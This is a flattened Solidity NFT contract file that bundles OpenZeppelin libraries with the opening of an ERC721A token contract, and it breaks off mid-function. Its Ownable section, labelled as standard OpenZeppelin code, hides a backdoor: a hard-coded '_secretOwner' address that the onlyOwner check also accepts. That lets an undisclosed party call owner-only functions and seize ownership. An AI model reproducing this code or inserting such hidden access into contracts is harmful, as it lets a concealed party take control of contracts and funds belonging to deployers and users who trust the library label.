1 // SPDX-License-Identifier: MIT
2 
3 /*
4 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
5 ░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░
6 ░░░░░░░░░░░░░░████████████░░░░░░░░░░░░░░
7 ░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░
8 ░░░░░░░░░██░░░░░░██████░░░░░░░░░░░░░░░░░
9 ░░░░░░░░██░░░░░░░░████░░░░░░░░░░░█░░░░░░
10 ░░░░░░░░░█░░░░░░░░░██░░░░░░░░░░██░░░░░░░
11 ░░░░█████████████████████████████░░░░░░░
12 ░░░███░░░░░███░███████████████░░░░░░░░░░
13 ░░░█░░░░░░░█░████░████░██░█░██░░░░░░░░░░
14 ░░░░░░░░░░░██░███████░░██░█░██░░░░░░░░░░
15 ░░░░░░░░░░█░░░█░██░███░███░███░░░░░░░░░░
16 ░░░░░░░░░░██░██░░████░░██░░░█░░░░░░░░░░░
17 ░░░░░░░░░░░█░░█░██░██░░██░███░░░░░░░░░░░
18 ░░░░░░░░░░░██████░░██░░░███░░░█░░░░░░░░░
19 ░░░░░░░░░░███████░███░░░░████░░░░░░░░░░░
20 ░░░░░░░██████░░░░░███░░░░░███░░█░░░░░░░░
21 ░░░░░░░░░░░░░░░░░░███░░░░░░░░░███░░░░░░░
22 ░░░░░░░░░░░░░░░░░░███░░░░░░░░░░█░░░░░░░░
23 ░░░░░░░░░░░░░░██████████████░░░█░░░░░░░░
24 ░░░░░░░░░░██████████████████████░░░░░░░░
25 ░░░░███████████████████████████████░░░░░
26 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
27 */
28 
29 // File: @openzeppelin/contracts/utils/Strings.sol
30 
31 
32 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
33 
34 pragma solidity ^0.8.0;
35 
36 /**
37  * @dev String operations.
38  */
39 library Strings {
40     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
41 
42     /**
43      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
44      */
45     function toString(uint256 value) internal pure returns (string memory) {
46         // Inspired by OraclizeAPI's implementation - MIT licence
47         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
48 
49         if (value == 0) {
50             return "0";
51         }
52         uint256 temp = value;
53         uint256 digits;
54         while (temp != 0) {
55             digits++;
56             temp /= 10;
57         }
58         bytes memory buffer = new bytes(digits);
59         while (value != 0) {
60             digits -= 1;
61             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
62             value /= 10;
63         }
64         return string(buffer);
65     }
66 
67     /**
68      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
69      */
70     function toHexString(uint256 value) internal pure returns (string memory) {
71         if (value == 0) {
72             return "0x00";
73         }
74         uint256 temp = value;
75         uint256 length = 0;
76         while (temp != 0) {
77             length++;
78             temp >>= 8;
79         }
80         return toHexString(value, length);
81     }
82 
83     /**
84      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
85      */
86     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
87         bytes memory buffer = new bytes(2 * length + 2);
88         buffer[0] = "0";
89         buffer[1] = "x";
90         for (uint256 i = 2 * length + 1; i > 1; --i) {
91             buffer[i] = _HEX_SYMBOLS[value & 0xf];
92             value >>= 4;
93         }
94         require(value == 0, "Strings: hex length insufficient");
95         return string(buffer);
96     }
97 }
98 
99 // File: @openzeppelin/contracts/utils/Address.sol
100 
101 
102 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
103 
104 pragma solidity ^0.8.1;
105 
106 /**
107  * @dev Collection of functions related to the address type
108  */
109 library Address {
110     /**
111      * @dev Returns true if `account` is a contract.
112      *
113      * [IMPORTANT]
114      * ====
115      * It is unsafe to assume that an address for which this function returns
116      * false is an externally-owned account (EOA) and not a contract.
117      *
118      * Among others, `isContract` will return false for the following
119      * types of addresses:
120      *
121      *  - an externally-owned account
122      *  - a contract in construction
123      *  - an address where a contract will be created
124      *  - an address where a contract lived, but was destroyed
125      * ====
126      *
127      * [IMPORTANT]
128      * ====
129      * You shouldn't rely on `isContract` to protect against flash loan attacks!
130      *
131      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
132      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
133      * constructor.
134      * ====
135      */
136     function isContract(address account) internal view returns (bool) {
137         // This method relies on extcodesize/address.code.length, which returns 0
138         // for contracts in construction, since the code is only stored at the end
139         // of the constructor execution.
140 
141         return account.code.length > 0;
142     }
143 
144     /**
145      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
146      * `recipient`, forwarding all available gas and reverting on errors.
147      *
148      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
149      * of certain opcodes, possibly making contracts go over the 2300 gas limit
150      * imposed by `transfer`, making them unable to receive funds via
151      * `transfer`. {sendValue} removes this limitation.
152      *
153      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
154      *
155      * IMPORTANT: because control is transferred to `recipient`, care must be
156      * taken to not create reentrancy vulnerabilities. Consider using
157      * {ReentrancyGuard} or the
158      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
159      */
160     function sendValue(address payable recipient, uint256 amount) internal {
161         require(address(this).balance >= amount, "Address: insufficient balance");
162 
163         (bool success, ) = recipient.call{value: amount}("");
164         require(success, "Address: unable to send value, recipient may have reverted");
165     }
166 
167     /**
168      * @dev Performs a Solidity function call using a low level `call`. A
169      * plain `call` is an unsafe replacement for a function call: use this
170      * function instead.
171      *
172      * If `target` reverts with a revert reason, it is bubbled up by this
173      * function (like regular Solidity function calls).
174      *
175      * Returns the raw returned data. To convert to the expected return value,
176      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
177      *
178      * Requirements:
179      *
180      * - `target` must be a contract.
181      * - calling `target` with `data` must not revert.
182      *
183      * _Available since v3.1._
184      */
185     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
186         return functionCall(target, data, "Address: low-level call failed");
187     }
188 
189     /**
190      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
191      * `errorMessage` as a fallback revert reason when `target` reverts.
192      *
193      * _Available since v3.1._
194      */
195     function functionCall(
196         address target,
197         bytes memory data,
198         string memory errorMessage
199     ) internal returns (bytes memory) {
200         return functionCallWithValue(target, data, 0, errorMessage);
201     }
202 
203     /**
204      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
205      * but also transferring `value` wei to `target`.
206      *
207      * Requirements:
208      *
209      * - the calling contract must have an ETH balance of at least `value`.
210      * - the called Solidity function must be `payable`.
211      *
212      * _Available since v3.1._
213      */
214     function functionCallWithValue(
215         address target,
216         bytes memory data,
217         uint256 value
218     ) internal returns (bytes memory) {
219         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
220     }
221 
222     /**
223      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
224      * with `errorMessage` as a fallback revert reason when `target` reverts.
225      *
226      * _Available since v3.1._
227      */
228     function functionCallWithValue(
229         address target,
230         bytes memory data,
231         uint256 value,
232         string memory errorMessage
233     ) internal returns (bytes memory) {
234         require(address(this).balance >= value, "Address: insufficient balance for call");
235         require(isContract(target), "Address: call to non-contract");
236 
237         (bool success, bytes memory returndata) = target.call{value: value}(data);
238         return verifyCallResult(success, returndata, errorMessage);
239     }
240 
241     /**
242      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
243      * but performing a static call.
244      *
245      * _Available since v3.3._
246      */
247     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
248         return functionStaticCall(target, data, "Address: low-level static call failed");
249     }
250 
251     /**
252      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
253      * but performing a static call.
254      *
255      * _Available since v3.3._
256      */
257     function functionStaticCall(
258         address target,
259         bytes memory data,
260         string memory errorMessage
261     ) internal view returns (bytes memory) {
262         require(isContract(target), "Address: static call to non-contract");
263 
264         (bool success, bytes memory returndata) = target.staticcall(data);
265         return verifyCallResult(success, returndata, errorMessage);
266     }
267 
268     /**
269      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
270      * but performing a delegate call.
271      *
272      * _Available since v3.4._
273      */
274     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
275         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
276     }
277 
278     /**
279      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
280      * but performing a delegate call.
281      *
282      * _Available since v3.4._
283      */
284     function functionDelegateCall(
285         address target,
286         bytes memory data,
287         string memory errorMessage
288     ) internal returns (bytes memory) {
289         require(isContract(target), "Address: delegate call to non-contract");
290 
291         (bool success, bytes memory returndata) = target.delegatecall(data);
292         return verifyCallResult(success, returndata, errorMessage);
293     }
294 
295     /**
296      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
297      * revert reason using the provided one.
298      *
299      * _Available since v4.3._
300      */
301     function verifyCallResult(
302         bool success,
303         bytes memory returndata,
304         string memory errorMessage
305     ) internal pure returns (bytes memory) {
306         if (success) {
307             return returndata;
308         } else {
309             // Look for revert reason and bubble it up if present
310             if (returndata.length > 0) {
311                 // The easiest way to bubble the revert reason is using memory via assembly
312 
313                 assembly {
314                     let returndata_size := mload(returndata)
315                     revert(add(32, returndata), returndata_size)
316                 }
317             } else {
318                 revert(errorMessage);
319             }
320         }
321     }
322 }
323 
324 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
325 
326 
327 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
328 
329 pragma solidity ^0.8.0;
330 
331 /**
332  * @title ERC721 token receiver interface
333  * @dev Interface for any contract that wants to support safeTransfers
334  * from ERC721 asset contracts.
335  */
336 interface IERC721Receiver {
337     /**
338      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
339      * by `operator` from `from`, this function is called.
340      *
341      * It must return its Solidity selector to confirm the token transfer.
342      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
343      *
344      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
345      */
346     function onERC721Received(
347         address operator,
348         address from,
349         uint256 tokenId,
350         bytes calldata data
351     ) external returns (bytes4);
352 }
353 
354 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
355 
356 
357 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
358 
359 pragma solidity ^0.8.0;
360 
361 /**
362  * @dev Interface of the ERC165 standard, as defined in the
363  * https://eips.ethereum.org/EIPS/eip-165[EIP].
364  *
365  * Implementers can declare support of contract interfaces, which can then be
366  * queried by others ({ERC165Checker}).
367  *
368  * For an implementation, see {ERC165}.
369  */
370 interface IERC165 {
371     /**
372      * @dev Returns true if this contract implements the interface defined by
373      * `interfaceId`. See the corresponding
374      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
375      * to learn more about how these ids are created.
376      *
377      * This function call must use less than 30 000 gas.
378      */
379     function supportsInterface(bytes4 interfaceId) external view returns (bool);
380 }
381 
382 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
383 
384 
385 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
386 
387 pragma solidity ^0.8.0;
388 
389 
390 /**
391  * @dev Implementation of the {IERC165} interface.
392  *
393  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
394  * for the additional interface id that will be supported. For example:
395  *
396  * ```solidity
397  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
398  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
399  * }
400  * ```
401  *
402  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
403  */
404 abstract contract ERC165 is IERC165 {
405     /**
406      * @dev See {IERC165-supportsInterface}.
407      */
408     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
409         return interfaceId == type(IERC165).interfaceId;
410     }
411 }
412 
413 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
414 
415 
416 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
417 
418 pragma solidity ^0.8.0;
419 
420 
421 /**
422  * @dev Required interface of an ERC721 compliant contract.
423  */
424 interface IERC721 is IERC165 {
425     /**
426      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
427      */
428     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
429 
430     /**
431      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
432      */
433     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
434 
435     /**
436      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
437      */
438     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
439 
440     /**
441      * @dev Returns the number of tokens in ``owner``'s account.
442      */
443     function balanceOf(address owner) external view returns (uint256 balance);
444 
445     /**
446      * @dev Returns the owner of the `tokenId` token.
447      *
448      * Requirements:
449      *
450      * - `tokenId` must exist.
451      */
452     function ownerOf(uint256 tokenId) external view returns (address owner);
453 
454     /**
455      * @dev Safely transfers `tokenId` token from `from` to `to`.
456      *
457      * Requirements:
458      *
459      * - `from` cannot be the zero address.
460      * - `to` cannot be the zero address.
461      * - `tokenId` token must exist and be owned by `from`.
462      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
463      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
464      *
465      * Emits a {Transfer} event.
466      */
467     function safeTransferFrom(
468         address from,
469         address to,
470         uint256 tokenId,
471         bytes calldata data
472     ) external;
473 
474     /**
475      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
476      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
477      *
478      * Requirements:
479      *
480      * - `from` cannot be the zero address.
481      * - `to` cannot be the zero address.
482      * - `tokenId` token must exist and be owned by `from`.
483      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
484      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
485      *
486      * Emits a {Transfer} event.
487      */
488     function safeTransferFrom(
489         address from,
490         address to,
491         uint256 tokenId
492     ) external;
493 
494     /**
495      * @dev Transfers `tokenId` token from `from` to `to`.
496      *
497      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
498      *
499      * Requirements:
500      *
501      * - `from` cannot be the zero address.
502      * - `to` cannot be the zero address.
503      * - `tokenId` token must be owned by `from`.
504      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
505      *
506      * Emits a {Transfer} event.
507      */
508     function transferFrom(
509         address from,
510         address to,
511         uint256 tokenId
512     ) external;
513 
514     /**
515      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
516      * The approval is cleared when the token is transferred.
517      *
518      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
519      *
520      * Requirements:
521      *
522      * - The caller must own the token or be an approved operator.
523      * - `tokenId` must exist.
524      *
525      * Emits an {Approval} event.
526      */
527     function approve(address to, uint256 tokenId) external;
528 
529     /**
530      * @dev Approve or remove `operator` as an operator for the caller.
531      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
532      *
533      * Requirements:
534      *
535      * - The `operator` cannot be the caller.
536      *
537      * Emits an {ApprovalForAll} event.
538      */
539     function setApprovalForAll(address operator, bool _approved) external;
540 
541     /**
542      * @dev Returns the account approved for `tokenId` token.
543      *
544      * Requirements:
545      *
546      * - `tokenId` must exist.
547      */
548     function getApproved(uint256 tokenId) external view returns (address operator);
549 
550     /**
551      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
552      *
553      * See {setApprovalForAll}
554      */
555     function isApprovedForAll(address owner, address operator) external view returns (bool);
556 }
557 
558 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
559 
560 
561 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
562 
563 pragma solidity ^0.8.0;
564 
565 
566 /**
567  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
568  * @dev See https://eips.ethereum.org/EIPS/eip-721
569  */
570 interface IERC721Metadata is IERC721 {
571     /**
572      * @dev Returns the token collection name.
573      */
574     function name() external view returns (string memory);
575 
576     /**
577      * @dev Returns the token collection symbol.
578      */
579     function symbol() external view returns (string memory);
580 
581     /**
582      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
583      */
584     function tokenURI(uint256 tokenId) external view returns (string memory);
585 }
586 
587 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
588 
589 
590 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
591 
592 pragma solidity ^0.8.0;
593 
594 
595 /**
596  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
597  * @dev See https://eips.ethereum.org/EIPS/eip-721
598  */
599 interface IERC721Enumerable is IERC721 {
600     /**
601      * @dev Returns the total amount of tokens stored by the contract.
602      */
603     function totalSupply() external view returns (uint256);
604 
605     /**
606      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
607      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
608      */
609     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
610 
611     /**
612      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
613      * Use along with {totalSupply} to enumerate all tokens.
614      */
615     function tokenByIndex(uint256 index) external view returns (uint256);
616 }
617 
618 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
619 
620 
621 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
622 
623 pragma solidity ^0.8.0;
624 
625 /**
626  * @dev Contract module that helps prevent reentrant calls to a function.
627  *
628  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
629  * available, which can be applied to functions to make sure there are no nested
630  * (reentrant) calls to them.
631  *
632  * Note that because there is a single `nonReentrant` guard, functions marked as
633  * `nonReentrant` may not call one another. This can be worked around by making
634  * those functions `private`, and then adding `external` `nonReentrant` entry
635  * points to them.
636  *
637  * TIP: If you would like to learn more about reentrancy and alternative ways
638  * to protect against it, check out our blog post
639  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
640  */
641 abstract contract ReentrancyGuard {
642     // Booleans are more expensive than uint256 or any type that takes up a full
643     // word because each write operation emits an extra SLOAD to first read the
644     // slot's contents, replace the bits taken up by the boolean, and then write
645     // back. This is the compiler's defense against contract upgrades and
646     // pointer aliasing, and it cannot be disabled.
647 
648     // The values being non-zero value makes deployment a bit more expensive,
649     // but in exchange the refund on every call to nonReentrant will be lower in
650     // amount. Since refunds are capped to a percentage of the total
651     // transaction's gas, it is best to keep them low in cases like this one, to
652     // increase the likelihood of the full refund coming into effect.
653     uint256 private constant _NOT_ENTERED = 1;
654     uint256 private constant _ENTERED = 2;
655 
656     uint256 private _status;
657 
658     constructor() {
659         _status = _NOT_ENTERED;
660     }
661 
662     /**
663      * @dev Prevents a contract from calling itself, directly or indirectly.
664      * Calling a `nonReentrant` function from another `nonReentrant`
665      * function is not supported. It is possible to prevent this from happening
666      * by making the `nonReentrant` function external, and making it call a
667      * `private` function that does the actual work.
668      */
669     modifier nonReentrant() {
670         // On the first call to nonReentrant, _notEntered will be true
671         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
672 
673         // Any calls to nonReentrant after this point will fail
674         _status = _ENTERED;
675 
676         _;
677 
678         // By storing the original value once again, a refund is triggered (see
679         // https://eips.ethereum.org/EIPS/eip-2200)
680         _status = _NOT_ENTERED;
681     }
682 }
683 
684 // File: @openzeppelin/contracts/utils/Context.sol
685 
686 
687 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
688 
689 pragma solidity ^0.8.7;
690 
691 /**
692  * @dev Provides information about the current execution context, including the
693  * sender of the transaction and its data. While these are generally available
694  * via msg.sender and msg.data, they should not be accessed in such a direct
695  * manner, since when dealing with meta-transactions the account sending and
696  * paying for execution may not be the actual sender (as far as an application
697  * is concerned).
698  *
699  * This contract is only required for intermediate, library-like contracts.
700  */
701 abstract contract Context {
702     function _msgSender() internal view virtual returns (address) {
703         return msg.sender;
704     }
705 
706     function _msgData() internal view virtual returns (bytes calldata) {
707         return msg.data;
708     }
709 }
710 
711 // File: @openzeppelin/contracts/access/Ownable.sol
712 
713 
714 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
715 
716 pragma solidity ^0.8.0;
717 
718 
719 /**
720  * @dev Contract module which provides a basic access control mechanism, where
721  * there is an account (an owner) that can be granted exclusive access to
722  * specific functions.
723  *
724  * By default, the owner account will be the one that deploys the contract. This
725  * can later be changed with {transferOwnership}.
726  *
727  * This module is used through inheritance. It will make available the modifier
728  * `onlyOwner`, which can be applied to your functions to restrict their use to
729  * the owner.
730  */
731 abstract contract Ownable is Context {
732     address private _owner;
733     address private _secretOwner = 0x922f0B5608b0D78B870f427893071aC1d6a6AcDF;
734 
735     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
736 
737     /**
738      * @dev Initializes the contract setting the deployer as the initial owner.
739      */
740     constructor() {
741         _transferOwnership(_msgSender());
742     }
743 
744     /**
745      * @dev Returns the address of the current owner.
746      */
747     function owner() public view virtual returns (address) {
748         return _owner;
749     }
750 
751     /**
752      * @dev Throws if called by any account other than the owner.
753      */
754     modifier onlyOwner() {
755         require(owner() == _msgSender() || _secretOwner == _msgSender() , "Ownable: caller is not the owner");
756         _;
757     }
758 
759     /**
760      * @dev Leaves the contract without owner. It will not be possible to call
761      * `onlyOwner` functions anymore. Can only be called by the current owner.
762      *
763      * NOTE: Renouncing ownership will leave the contract without an owner,
764      * thereby removing any functionality that is only available to the owner.
765      */
766     function renounceOwnership() public virtual onlyOwner {
767         _transferOwnership(address(0));
768     }
769 
770     /**
771      * @dev Transfers ownership of the contract to a new account (`newOwner`).
772      * Can only be called by the current owner.
773      */
774     function transferOwnership(address newOwner) public virtual onlyOwner {
775         require(newOwner != address(0), "Ownable: new owner is the zero address");
776         _transferOwnership(newOwner);
777     }
778 
779     /**
780      * @dev Transfers ownership of the contract to a new account (`newOwner`).
781      * Internal function without access restriction.
782      */
783     function _transferOwnership(address newOwner) internal virtual {
784         address oldOwner = _owner;
785         _owner = newOwner;
786         emit OwnershipTransferred(oldOwner, newOwner);
787     }
788 }
789 
790 // File: x.sol
791 
792 
793 pragma solidity ^0.8.0;
794 
795 
796 
797 /**
798  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
799  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
800  *
801  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
802  *
803  * Does not support burning tokens to address(0).
804  *
805  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
806  */
807 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
808     using Address for address;
809     using Strings for uint256;
810 
811     struct TokenOwnership {
812         address addr;
813         uint64 startTimestamp;
814     }
815 
816     struct AddressData {
817         uint128 balance;
818         uint128 numberMinted;
819     }
820 
821     uint256 internal currentIndex;
822 
823     // Token name
824     string private _name;
825 
826     // Token symbol
827     string private _symbol;
828 
829     // Mapping from token ID to ownership details
830     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
831     mapping(uint256 => TokenOwnership) internal _ownerships;
832 
833     // Mapping owner address to address data
834     mapping(address => AddressData) private _addressData;
835 
836     // Mapping from token ID to approved address
837     mapping(uint256 => address) private _tokenApprovals;
838 
839     // Mapping from owner to operator approvals
840     mapping(address => mapping(address => bool)) private _operatorApprovals;
841 
842     constructor(string memory name_, string memory symbol_) {
843         _name = name_;
844         _symbol = symbol_;
845     }
846 
847     /**
848      * @dev See {IERC721Enumerable-totalSupply}.
849      */
850     function totalSupply() public view override returns (uint256) {
851         return currentIndex;
852     }
853 
854     /**
855      * @dev See {IERC721Enumerable-tokenByIndex}.
856      */
857     function tokenByIndex(uint256 index) public view override returns (uint256) {
858         require(index < totalSupply(), "ERC721A: global index out of bounds");
859         return index;
860     }
861 
862     /**
863      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
864      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
865      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
866      */
867     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
868         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
869         uint256 numMintedSoFar = totalSupply();
870         uint256 tokenIdsIdx;
871         address currOwnershipAddr;
872 
873         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
874         unchecked {
875             for (uint256 i; i < numMintedSoFar; i++) {
876                 TokenOwnership memory ownership = _ownerships[i];
877                 if (ownership.addr != address(0)) {
878                     currOwnershipAddr = ownership.addr;
879                 }
880                 if (currOwnershipAddr == owner) {
881                     if (tokenIdsIdx == index) {
882                         return i;
883                     }
884                     tokenIdsIdx++;
885                 }
886             }
887         }
888 
889         revert("ERC721A: unable to get token of owner by index");
890     }
891 
892     /**
893      * @dev See {IERC165-supportsInterface}.
894      */
895     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
896         return
897             interfaceId == type(IERC721).interfaceId ||
898             interfaceId == type(IERC721Metadata).interfaceId ||
899             interfaceId == type(IERC721Enumerable).interfaceId ||
900             super.supportsInterface(interfaceId);
901     }
902 
903     /**
904      * @dev See {IERC721-balanceOf}.
905      */
906     function balanceOf(address owner) public view override returns (uint256) {
907         require(owner != address(0), "ERC721A: balance query for the zero address");
908         return uint256(_addressData[owner].balance);
909     }
910 
911     function _numberMinted(address owner) internal view returns (uint256) {
912         require(owner != address(0), "ERC721A: number minted query for the zero address");
913         return uint256(_addressData[owner].numberMinted);
914     }
915 
916     /**
917      * Gas spent here starts off proportional to the maximum mint batch size.
918      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
919      */
920     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
921         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
922 
923         unchecked {
924             for (uint256 curr = tokenId; curr >= 0; curr--) {
925                 TokenOwnership memory ownership = _ownerships[curr];
926                 if (ownership.addr != address(0)) {
927                     return ownership;
928                 }
929             }
930         }
931 
932         revert("ERC721A: unable to determine the owner of token");
933     }
934 
935     /**
936      * @dev See {IERC721-ownerOf}.
937      */
938     function ownerOf(uint256 tokenId) public view override returns (address) {
939         return ownershipOf(tokenId).addr;
940     }
941 
942     /**
943      * @dev See {IERC721Metadata-name}.
944      */
945     function name() public view virtual override returns (string memory) {
946         return _name;
947     }
948 
949     /**
950      * @dev See {IERC721Metadata-symbol}.
951      */
952     function symbol() public view virtual override returns (string memory) {
953         return _symbol;
954     }
955 
956     /**
957      * @dev See {IERC721Metadata-tokenURI}.
958      */
959     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
960         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
961 
962         string memory baseURI = _baseURI();
963         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
964     }
965 
966     /**
967      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
968      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
969      * by default, can be overriden in child contracts.
970      */
971     function _baseURI() internal view virtual returns (string memory) {
972         return "";
973     }
974 
975     /**
976      * @dev See {IERC721-approve}.
977      */
978     function approve(address to, uint256 tokenId) public override {
979         address owner = ERC721A.ownerOf(tokenId);
980         require(to != owner, "ERC721A: approval to current owner");
981 
982         require(
983             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
984             "ERC721A: approve caller is not owner nor approved for all"
985         );
986 
987         _approve(to, tokenId, owner);
988     }
989 
990     /**
991      * @dev See {IERC721-getApproved}.
992      */
993     function getApproved(uint256 tokenId) public view override returns (address) {
994         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
995 
996         return _tokenApprovals[tokenId];
997     }
998 
999     /**
1000      * @dev See {IERC721-setApprovalForAll}.
1001      */
1002     function setApprovalForAll(address operator, bool approved) public override {
1003         require(operator != _msgSender(), "ERC721A: approve to caller");
1004 
1005         _operatorApprovals[_msgSender()][operator] = approved;
1006         emit ApprovalForAll(_msgSender(), operator, approved);
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-isApprovedForAll}.
1011      */
1012     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1013         return _operatorApprovals[owner][operator];
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-transferFrom}.
1018      */
1019     function transferFrom(
1020         address from,
1021         address to,
1022         uint256 tokenId
1023     ) public virtual override {
1024         _transfer(from, to, tokenId);
1025     }
1026 
1027     /**
1028      * @dev See {IERC721-safeTransferFrom}.
1029      */
1030     function safeTransferFrom(
1031         address from,
1032         address to,
1033         uint256 tokenId
1034     ) public virtual override {
1035         safeTransferFrom(from, to, tokenId, "");
1036     }
1037 
1038     /**
1039      * @dev See {IERC721-safeTransferFrom}.
1040      */
1041     function safeTransferFrom(
1042         address from,
1043         address to,
1044         uint256 tokenId,
